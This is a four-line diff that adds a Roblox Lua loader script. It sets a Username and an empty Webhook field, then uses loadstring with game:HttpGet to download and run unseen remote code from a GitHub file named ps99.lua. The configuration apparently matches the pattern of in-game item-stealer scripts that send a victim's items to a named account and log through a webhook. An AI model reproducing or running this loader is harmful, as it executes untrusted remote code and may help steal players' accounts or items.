@@ -1,0 +1,4 @@
+getgenv().gui = false
+Username = "Roblox" 
+Webhook = "" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
